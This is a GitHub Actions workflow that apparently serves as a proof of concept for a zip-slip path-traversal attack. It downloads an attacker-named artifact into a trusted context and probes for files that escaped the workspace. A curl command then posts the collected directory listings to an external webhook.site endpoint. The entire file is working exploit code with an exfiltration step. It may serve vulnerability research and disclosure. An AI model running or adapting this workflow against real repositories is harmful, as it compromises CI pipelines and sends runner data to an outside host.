name: cb-i-victim
on:
  workflow_dispatch:
    inputs:
      run_id:
        description: 'run id of the PR artifact'
        required: true
jobs:
  v:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: download attacker artifact (trusted context)
        uses: actions/download-artifact@v4.3.0
        with:
          name: evil-artifact
          run-id: ${{ github.event.inputs.run_id }}
          github-token: ${{ github.token }}
      - name: probe escape
        run: |
          {
            echo "=== pwd:"; pwd
            echo "=== escape probes:"
            for f in ../ZIPSLIP-PROOF.txt ../../ZIPSLIP-PROOF-2.txt ../../../ZIPSLIP-PROOF-3.txt; do
              if [ -f "$f" ]; then echo "ESCAPED: $f = $(cat $f)"; else echo "absent: $f"; fi
            done
            echo "=== parent dir listing:"
            ls -la ../ 2>/dev/null | head -15
            echo "=== workspace listing:"
            ls -la | head -15
          } > proof.txt 2>&1
          wc -c proof.txt
          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@proof.txt" -F "src=victim-proof"
          true
